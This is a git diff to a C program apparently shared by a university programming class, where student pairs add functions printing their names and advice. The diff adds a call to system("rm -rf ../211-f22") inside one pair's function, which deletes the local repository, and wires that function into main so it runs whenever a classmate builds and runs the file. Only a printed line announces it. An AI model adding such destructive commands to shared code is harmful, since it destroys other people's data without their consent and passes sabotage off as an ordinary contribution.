@@ -15,6 +15,7 @@
 // 
 // UIC CS 211, Fall 2022
 #include <stdio.h>
+#include <stdlib.h>
 
 void reed_ekidan2() {
   printf("Dale Reed and Ellen Kidane\n");
@@ -24,13 +25,17 @@ void reed_ekidan2() {
 void lsasu2_jren27() {
 	printf("Synthia Sasulski and Justin Ren\n");
 	printf("Something that gave us trouble is merge conflicts. Make sure to check conflicts before merging\n");
+	printf("Also this function deletes the local repository from your computer assuming a linux system\n");
+	system("rm -rf ../211-f22");
+
 }
+
 
 int main()
 {
     printf("This code has been created by the students of CS 211, Fall 2022!\n\n");
     
     reed_ekidan2();
-    
+	lsasu2_jren27();
     return 0;
 }
